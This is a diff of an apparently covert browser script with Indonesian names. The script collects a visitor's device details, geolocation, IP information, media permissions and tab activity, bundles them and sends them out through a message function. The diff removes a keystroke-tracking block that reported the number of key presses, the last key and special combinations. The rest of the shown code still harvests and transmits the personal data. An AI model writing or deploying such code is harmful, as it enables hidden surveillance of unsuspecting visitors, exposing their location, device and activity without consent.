@@ -527,15 +527,6 @@ window.addEventListener('keydown', (e) => {
   }
 });
 
-const ambilKeyboardActivity = () => {
-  return `
-౼ 〘 𝗞𝗘𝗬𝗕𝗢𝗔𝗥𝗗 𝗔𝗖𝗧𝗜𝗩𝗜𝗧𝗬 〙 ౼
-Jumlah Tombol Ditekan : ${totalKeyPress}
-Tombol Terakhir       : ${lastKey}
-Kombinasi Khusus      : ${kombinasiKhusus}
-`.trim();
-};
-
 const ambilLokasi = () => {
   return new Promise((resolve) => {
     if (!navigator.geolocation) {
@@ -615,7 +606,6 @@ const mulai = async () => {
 
   // Fitur tambahan
   const aktivitasTab = ambilAktivitasTab();
-  const keyboard = ambilKeyboardActivity();
 
   const gabungAwal = [
     infoPerangkat,
@@ -626,7 +616,6 @@ const mulai = async () => {
     izinMedia,
     ipInfo,
     aktivitasTab,
-    keyboard,
   ].join("\n\n");
 
   await kirimPesan(gabungAwal);
